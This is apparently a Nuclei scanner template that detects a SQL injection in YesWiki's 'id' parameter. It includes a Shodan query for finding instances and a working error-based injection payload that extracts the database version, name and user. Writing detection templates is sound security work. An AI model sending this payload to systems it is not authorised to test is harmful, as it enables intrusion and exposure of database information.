id: yeswiki-sql

info:
  name: YesWiki - SQL Injection
  author: arafatansari
  severity: medium
  description: |
    YesWiki before 2022-07-07 allows SQL Injection via the "id" parameter in the AccueiL URL.
  reference:
    - https://huntr.dev/bounties/32e27955-376a-48fe-9984-87dd77e24985/
  metadata:
    shodan-query: http.html:"yeswiki"
    verified: "true"
  tags: sql,cve,2022

requests:
  - method: GET
    path:
      - '{{BaseURL}}/?PagePrincipale/rss&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,version(),database(),user()))))--+-'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - 'MariaDB'
        condition: and
